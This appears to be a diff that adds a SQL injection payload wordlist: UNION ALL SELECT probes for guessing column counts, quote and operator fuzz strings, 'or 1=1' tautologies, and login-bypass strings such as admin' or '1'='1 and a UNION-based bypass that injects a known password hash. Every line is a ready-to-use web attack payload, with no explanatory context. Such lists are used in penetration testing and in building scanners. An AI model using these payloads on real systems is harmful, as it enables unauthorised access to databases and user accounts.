+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX'#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
